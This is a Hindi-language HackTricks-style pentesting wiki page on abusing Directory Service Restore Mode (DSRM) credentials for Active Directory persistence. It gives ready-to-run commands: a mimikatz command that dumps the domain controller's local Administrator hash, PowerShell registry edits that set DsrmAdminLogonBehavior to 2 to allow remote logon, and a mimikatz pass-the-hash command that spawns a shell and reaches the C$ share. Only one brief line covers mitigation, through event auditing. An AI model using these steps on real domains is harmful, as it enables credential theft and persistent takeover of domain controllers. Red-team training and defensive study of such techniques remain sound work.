# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

प्रत्येक **DC** के अंदर एक **local administrator** account होता है। इस machine में admin privileges होने पर आप mimikatz का उपयोग करके **local Administrator hash** को **dump** कर सकते हैं। फिर, एक registry को modify करके इस password को **activate** कर सकते हैं, ताकि आप इस local Administrator user को remotely access कर सकें।\
सबसे पहले हमें DC के अंदर मौजूद **local Administrator** user का **hash** **dump** करना होगा:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
फिर हमें जांचना होगा कि वह account काम करेगा या नहीं, और यदि registry key का मान "0" है या वह मौजूद नहीं है, तो आपको इसे **"2" पर सेट करना होगा**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
फिर, PTH का उपयोग करके आप **C$ की सामग्री सूचीबद्ध कर सकते हैं या shell भी प्राप्त कर सकते हैं**। ध्यान दें कि उस hash को memory में रखकर (PTH के लिए) नया powershell session बनाने हेतु इस्तेमाल किया गया **"domain" केवल DC machine का नाम है:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
इसके बारे में अधिक जानकारी: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) और [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## शमन

- Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` के creation/change का Audit

## संदर्भ

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
